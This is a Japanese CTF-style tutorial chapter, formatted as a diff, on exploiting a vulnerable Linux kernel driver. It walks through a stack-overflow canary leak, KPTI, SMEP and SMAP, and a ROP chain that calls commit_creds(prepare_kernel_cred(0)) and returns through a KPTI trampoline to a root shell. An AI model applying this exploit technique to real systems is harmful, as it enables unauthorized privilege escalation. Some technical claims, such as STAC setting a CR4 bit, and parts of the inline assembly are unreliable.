@@ -366,4 +366,383 @@ L37は、CR3をuserlandのものに戻しています。さっきの逆ですね
 
 そして最終的にもう一度`swapgs`をしてGSをユーザのもの(0)に戻して、めでたく`iretq`で帰還しています。
 
+## 脆弱性
+
+配布ファイルを見て内容を確認してみてください。
+ソースコードは以下のようになっています:
+
+```c
+typedef struct smap_data_t {
+  char *buf;
+  size_t len;
+} smap_data;
+
+long smap_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
+  long ret = 0;
+  char buf[SMAP_BUFSZ] = {0};
+  smap_data data;
+
+  if (copy_from_user(&data, (smap_data *)arg, sizeof(smap_data))) {
+    return -EFAULT;
+  }
+
+  switch (cmd) {
+    case SMAP_IOCTL_WRITE:
+      if (_copy_from_user(buf, data.buf, data.len)) {
+        ret = -EFAULT;
+      }
+      break;
+    case SMAP_IOCTL_READ:
+      if (_copy_to_user(data.buf, buf, data.len)) {
+        ret = -EFAULT;
+      }
+      break;
+    default:
+      ret = -EINVAL;
+  }
+
+  return ret;
+}
+```
+
+`ioctl`では第3引数を介してユーザデータを渡すことができ、今回は`struct smap_data_t`型として定義されています。
+コマンドは2つ用意されており、`SMAP_IOCTL_WRITE`ではstack上の`buf`に対して書き込みが、
+`SMAP_IOCTL_READ`では読み込みができます。
+
+脆弱性は明らかで、`_copy_from/to_user()`に渡すサイズをユーザが任意に指定することができ、
+そのサイズが`SMAP_BUFSZ`を超える場合にはstack overflowが発生します。
+
+### canary leakとRIP hijack...?
+
+kernelとはいってもstackの構造は変わりません。
+よって、RAを書き換えてuserlandに用意した関数を実行することを目指しましょう。
+
+ちょっとその前に、`run.sh`の以下の箇所を修正しておいてください:
+
+```sh
+  -cpu kvm64,+smep,+smap \
+=>
+  -cpu kvm64,-smep,-smap \
+```
+
+まずは`SMAP_IOCTL_READ`でcanaryをleakします。
+`/proc/kallsyms`から`smap_ioctl()`のアドレスを調べ、そこにbpを貼ってみましょう。
+stackの用意がされたあとに`tele`コマンドで見てみると以下のようになっています:
+
+```sh
+0xffffc90000443d80|+0x0000|000: 0x0000000000000000 <fixed_percpu_data>  <-  $rsp
+0xffffc90000443d88|+0x0008|001: 0x0000000001100dca
+0xffffc90000443d90|+0x0010|002: 0x0000000000000000 <fixed_percpu_data>
+0xffffc90000443d98|+0x0018|003: 0xffffffff81edfca0 <boot_cpu_data>  ->  0x000000000106000f  <-  $rdi
+0xffffc90000443da0|+0x0020|004: 0x0000000000000255
+...
+0xffffc90000443e70|+0x00f0|030: 0xffff8880031c6770  ->  0x8000000001a2a067
+0xffffc90000443e78|+0x00f8|031: 0xffffea00000c71a8  ->  0x0000000000000000 <fixed_percpu_data>
+0xffffc90000443e80|+0x0100|032: 0x0000000000000000 <fixed_percpu_data>
+0xffffc90000443e88|+0x0108|033: 0x2aed9ca7a13c1f00
+0xffffc90000443e90|+0x0110|034: 0x2aed9ca7a13c1f00
+0xffffc90000443e98|+0x0118|035: 0x0000000000000003 <fixed_percpu_data+0x3>
+0xffffc90000443ea0|+0x0120|036: 0xffffc90000443f30  ->  0xffffc90000443f48  ->  0x0000000000000000 <fixed_percpu_data>  <-  $rbp
+0xffffc90000443ea8|+0x0128|037: 0xffffffff81161406 <__x64_sys_ioctl+0x3e6>  ->  0x413e74fffffdfd3d
+```
+
+`$rbp + 0x8`がRA、`$rbp - 0x10`がcanaryです
+(`$rbp - 0x18`にもcanaryが入っているのは、前のstack frameのcanaryの名残かと思われます)。
+
+また、`smap_ioctl()`を`disass`してみると以下のような箇所があるため、`buf`は`$rbp-0x110`に確保されることが分かります:
+
+```S
+    0xffffffffc000002f 31c0               <NO_SYMBOL>   xor    eax, eax
+    0xffffffffc0000031 48c785f0feffff..   <NO_SYMBOL>   mov    QWORD PTR [rbp - 0x110], 0x0
+ -> 0xffffffffc000003c f348ab             <NO_SYMBOL>   rep    stos QWORD PTR es:[rdi], rax
+```
+
+よって、以下のようにして`canary`をleakすることができます:
+
+```c
+char *buf = malloc(BUFSZ);
+memset(buf, 0, BUFSZ);
+smap_read(fd, buf, 0x150);
+const ulong canary = *(ulong *)(buf + 0x100);
+const ulong rbp = *(ulong *)(buf + 0x108);
+printf("[+] canary: 0x%lx\n", canary);
+```
+
+あとはRAを書き換えるだけです。
+RAを書き換える際にはcanaryも一緒に書き換える必要があるため、leakした値で上書きするようにします。
+[Warmup](/kernel/warmup)の章でも使ったような`get_root()`関数に飛ばしてみましょう:
+
+```c
+memset(buf, 'A', BUFSZ);
+*(ulong *)(buf + 0x100) = canary;
+*(ulong *)(buf + 0x100 + 0x10) = rbp;
+*(ulong *)(buf + 0x100 + 0x18) = (ulong)get_root;
+smap_write(fd, buf, 0x128);
+```
+
+これを実行すると以下のようになります:
+
+```txt
+/ # ./exploit
+[ ] START of life...
+[+] get_root: 0x40294a
+[+] canary: 0x6c600ff28ff49400
+BUG: unable to handle page fault for address: 000000000040294a
+#PF: supervisor instruction fetch in kernel mode
+#PF: error_code(0x0011) - permissions violation
+PGD 80000000032df067 P4D 80000000032df067 PUD 32de067 PMD 32d8067 PTE 1fef025
+Oops: 0011 [#1] SMP PTI
+CPU: 0 PID: 137 Comm: exploit Tainted: G           O      5.15.0 #2
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+RIP: 0010:0x40294a
+Code: Unable to access opcode bytes at RIP 0x402920.
+RSP: 0018:ffffc9000045beb0 EFLAGS: 00000246
+RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
+RDX: 0000000000000000 RSI: 00000000004ed8a8 RDI: ffffc9000045beb8
+RBP: 0000000000000003 R08: 00000000004028ff R09: 4141414141414141
+R10: 4141414141414141 R11: 4141414141414141 R12: ffff8880031e8700
+R13: 00007ffeb05fb890 R14: ffff8880031e8700 R15: 0000000000001000
+```
+
+`000000000040294a`にのページフォルトを処理できないと言っています。
+これは`get_root()`のアドレスです。
+
+これは **KPTI** と呼ばれるセキュリティ機構によるものです。
+
+### KPTI (Kernel Page Table Isolation)
+
+[KPTI](https://www.kernel.org/doc/html/next/x86/pti.html)は、[Meltdown](https://meltdownattack.com/)と呼ばれる脆弱性に対する対策として導入されたものです。
+
+KPTIが導入される前は、userlandとkernelのページテーブルは同じものを使っていました。
+具体的には、kernelとuserlandで同じPGDを共有して使っていました。
+もちろんページ権限としてはuserからkernelにアクセスすることはできなかったのですが、
+CPUの投機的実行とキャッシュを利用してkernelのメモリを読み出すことができてしまうという脆弱性がありました。
+そこで、そもそもuserlandとkernelのページテーブルを分けてしまいuserlandのPGDには
+kernelのマッピングをほとんどしないようになりました。これがKPTIです。
+
+KPTIは`CONFIG_PAGE_TABLE_ISOLATION`を有効にすることで有効化できます。
+また、bootオプションとして`nopti`をつけると無効化できます。
+対応するコードは以下のとおりです:
+
+```c
+// /arch/x86/include/asm/pgalloc.h
+#define PGD_ALLOCATION_ORDER 1
+#else
+#define PGD_ALLOCATION_ORDER 0
+#endif
+
+// /arch/x86/mm/pgtable.c
+static inline pgd_t *_pgd_alloc(void)
+{
+	return (pgd_t *)__get_free_pages(GFP_PGTABLE_USER,
+					 PGD_ALLOCATION_ORDER);
+}
+```
+
+KPTIが有効になっていると、PGDを確保する際には2ページ分取得していることが分かります。
+この関数は隣接するページ(Order-1 Page)を取得するため、最初のページがkernel用・続くページがuser用のPGDになります。
+そのため、kernel PGDの`PAGE_SHITF (12)`bit目を立てるだけでuser PGDを取得することができます:
+
+```c
+static inline pgd_t *kernel_to_user_pgdp(pgd_t *pgdp)
+{
+	return ptr_set_bit(pgdp, PTI_PGTABLE_SWITCH_BIT);
+}
+```
+
+ここで、先程syscall entryで見た謎の`SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp`の意味が分かるようになります。
+このマクロはCR3レジスタの11/12-th bitを下ろしていました。
+これは、user PGDからkernel PGDへの切り替えを意味していたんですね。
+
+ちなみに、11-th bitは**PCID** bitと呼ばれています。
+本来ならばCR3を切り替えた(PGDを切り替えた)場合には、TLBを全てフラッシュしてやる必要があります。
+そうしないと、PGDが切り替わってアドレス変換のルールが変わったのに
+古いルールで変換した結果をTLBから取ってくることになっちゃいますからね。
+しかし、user<->kernel CR3の変換のたびにTLBフラッシュしてると遅くなってしまうので、
+PCID機能を利用してキャッシュにタグ付けができるようにしています。
+これによって、CR3を切り替えたときに全てを即座にフラッシュする必要がなくなるという仕組みらしいです。
+詳しくは[このへん](https://www.kernel.org/doc/Documentation/x86/pti.txt)を読んでみてください。
+
+ところで、今回のシナリオではkernel PGDを保持した状態でuserlandの関数を呼んだはずです。
+KPTIでは、userからkernelのマップは見えなくなりますが、kernelからuserのマップは読むことができます。
+ではどうしてエラーになったのでしょうか。
+実は、 **KPTIではuserからkernelマップを見えなくする以外に、kernelからはuserのマップがNXに見えるようにしています**
+(多分おまけ的な感じです):
+
+```c
+pgd_t __pti_set_user_pgtbl(pgd_t *pgdp, pgd_t pgd)
+{
+	...
+	if ((pgd.pgd & (_PAGE_USER|_PAGE_PRESENT)) == (_PAGE_USER|_PAGE_PRESENT) &&
+	    (__supported_pte_mask & _PAGE_NX))
+		pgd.pgd |= _PAGE_NX;}
+	...
+}
+```
+
+実際、`vmmap`か何かで見てみると`R--`としてマップされていることがわかると思います:
+
+```txt
+Virtual address start-end          Physical address start-end         Total size   Page size   Count  Flags
+0000000000400000-0000000000401000  0000000001ff1000-0000000001ff2000  0x1000       0x1000      1      [R-- USER ACCESSED]
+0000000000401000-0000000000402000  0000000001ff0000-0000000001ff1000  0x1000       0x1000      1      [R-- USER ACCESSED]
+0000000000402000-0000000000403000  0000000001fef000-0000000001ff0000  0x1000       0x1000      1      [R-- USER ACCESSED]
+0000000000403000-0000000000404000  0000000001fee000-0000000001fef000  0x1000       0x1000      1      [R-- USER ACCESSED]
+0000000000404000-0000000000405000  0000000001fed000-0000000001fee000  0x1000       0x1000      1      [R-- USER ACCESSED]
+```
+
+というわけで、KPTIが有効な状態では単純にuserlandの関数にジャンプするということはできません。
+
+### SMEP / SMAP
+
+さて、ここで一つ実験として`run.sh`の`-append`オプションに`nopti`を追加してKPTIを無効化してみましょう。
+それと同時に、先程編集した`-smep,-smap`の部分を`+smep,+smap`に戻します。
+この状態で先程のexploitを実行してみてください:
+
+```txt
+/ # ./exploit
+[ ] START of life...
+[+] get_root: 0x40294a
+[+] canary: 0x5151c42bf165bc00
+unable to execute userspace code (SMEP?) (uid: 0)
+BUG: unable to handle page fault for address: 000000000040294a
+#PF: supervisor instruction fetch in kernel mode
+#PF: error_code(0x0011) - permissions violation
+PGD 32ad067 P4D 32ad067 PUD 32ae067 PMD 3278067 PTE 1fef025
+Oops: 0011 [#1] SMP NOPTI
+CPU: 0 PID: 152 Comm: exploit Tainted: G           O      5.15.0 #2
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+RIP: 0010:0x40294a
+Code: Unable to access opcode bytes at RIP 0x402920.
+RSP: 0018:ffffc90000463eb0 EFLAGS: 00000246
+RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
+RDX: 0000000000000000 RSI: 00000000004ed8a8 RDI: ffffc90000463eb8
+RBP: 0000000000000003 R08: 00000000004028ff R09: 4141414141414141
+R10: 4141414141414141 R11: 4141414141414141 R12: ffff888003192f00
+R13: 00007ffe59b19250 R14: ffff888003192f00 R15: 0000000000001000
+```
+
+KPTIを無効化したのに落ちてしまいました。
+これは、**SMEP (Supervisor Mode Execution Prevention)** / **SMAP (Supervisor Mode Access Prevention)** というCPUのセキュリティ機構によるものです。
+SMEP/SMAPが有効だと、ring-0の状態でuserのページにあるコードの実行およびデータへのアクセスがそれぞれできなくなります。
+これは**CR4**レジスタの20/21-th bitを立てることで有効化されます。
+なお、KPTIはLinux(ソフト)のセキュリティ機構・SMEP/SMAPはIntel(ハード)のセキュリティ機構となります。
+
+それでは、`_copy_to_user()`関数等はどうやってユーザ領域にアクセスしているのでしょうか。
+`copy_to_user`は設定にもよりますが、以下のようなアセンブリコードを呼び出します:
+
+```S
+; /arch/x86/lib/copy_user_64.S
+SYM_FUNC_START(copy_user_generic_unrolled)
+	ASM_STAC
+	cmpl $8,%edx
+  ...
+
+// /arch/x86/include/asm/smap.h
+#define __ASM_STAC	".byte 0x0f,0x01,0xcb"
+static __always_inline void stac(void)
+{
+	/* Note: a barrier is implicit in alternative() */
+	alternative("", __ASM_STAC, X86_FEATURE_SMAP);
+}
+```
+
+`ASM_STAC`によってCR4ののSMAP bitを設定してやっています。
+この関数中は一時的にSMAPを無効化することでアクセスできるようにしているようですね。
+
+というわけで、SMAP/SMEPが有効化されている場合にはkernelからuserにアクセスすることはできなくなります。
+ただし、`copy_to_user`等がしているように、`CR4`レジスタをいじってあげれば、これらの制約は解除することが出来るようです。
+
+## exploit方針
+
+さて、先程`run.sh`に追加した`nopti`オプションを消してあげましょう。
+これで晴れてKPTI/SMAP/SMEP有効な状態になります。
+KPTIが有効なので、userlandの関数にはジャンプできません。
+よって、ROPでkernelにいる状態で権限昇格をしてしまいましょう。
+ROPについて詳しくは [userland ROP](/user/rop) の章を見てください。
+
+基本方針は[Warmup](/kernel/warmup)の章と同じです。
+`commit_creds(prepare_kernel_cred(0))`をします:
+
+```c
+  ulong *chn = (ulong *)(buf + 0x100 + 0x18);
+  ulong *chn_orig = chn;
+  *chn++ = 0xffffffff810caadd;  // pop rdi
+  *chn++ = 0;
+  *chn++ = (ulong)prepare_kernel_cred;
+  *chn++ = 0xffffffff812a85e4;  // pop rcx
+  *chn++ = 0;
+  *chn++ = 0xffffffff8165bf2b;  // mov rdi, rax; rep movsq
+  *chn++ = (ulong)commit_creds;
+```
+
+これで権限昇格自体は完成です。
+しかし、このあとできれいにuserlandに戻る必要があります。
+
+userlandに戻るには、[syscall](#do_syscall_64--userlandへの帰還)のセクションで見たような処理をすればOKです。
+すなわち、**`swapgs`でGSを切り替えた後、`iretq`で戻ります**。
+このとき、userland用のCS/RFLAGS/RSP/SSレジスタをstackに積んでおく必要があります。
+よって、これらの値をuserlandにいるうちに保存しておく必要があります。
+以下の関数をROPを始める前に実行しておきましょう:
+
+```c
+ulong user_cs, user_ss, user_sp, user_rflags;
+
+// should compile with -masm=intel
+static void save_state(void) {
+  asm("movq %0, %%cs\n"
+      "movq %1, %%ss\n"
+      "movq %2, %%rsp\n"
+      "pushfq\n"
+      "popq %3\n"
+      : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
+      :
+      : "memory");
+}
+```
+
+あとは`swapgs` / `iretq`をするためのROP-chainを積み込みます:
+
+```c
+  *chn++ = 0xffffffff81800e26;  // save stack + swapgs
+  *chn++ = 0;                   // trash
+  *chn++ = 0;                   // trash
+  *chn++ = (ulong)shell;
+  *chn++ = user_cs;
+  *chn++ = user_rflags;
+  *chn++ = user_sp;
+  *chn++ = user_ss;
+```
+
+`0xffffffff81800e26`はsyscall entrypointのLに該当する部分です:
+
+```s
+	movq	%rsp, %rdi
+	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
+	UNWIND_HINT_EMPTY
+
+	pushq	6*8(%rdi)	/* SS */
+	pushq	5*8(%rdi)	/* RSP */
+	pushq	4*8(%rdi)	/* EFLAGS */
+	pushq	3*8(%rdi)	/* CS */
+	pushq	2*8(%rdi)	/* RIP */
+	pushq	(%rdi)
+	STACKLEAK_ERASE_NOCLOBBER
+	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi
+	popq	%rdi
+	swapgs
+	jmp	.Lnative_iret
+```
+
+なお、L2のkernel stackを保存する部分も大事です。
+L2以降はいわゆるトランポリンスタックを使うように設定してくれます。
+ROP-chainに積むRFLAGSやRSPは有効なものであればまぁなんでもいいです。
+どうせuserlandに戻ってきたらすぐに新しいプロセス(root shell)を立ち上げるので。
+`RIP`に対応する部分には`system("/bin/sh")`をするような関数のアドレスを入れておきましょう。
+
+------------------------------------
+
+これでROPを使ったSMEP/SMAP(ついでにKPTI)バイパスができるはずです。
+ぜひリモートで実際に権限昇格をしてみてください。
+
 [^1]: 画像は[Intel Architectures Software Developer Manuals (SDM)](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)からの引用です。以下、特に断らない限り画像はSDMからの出典です。
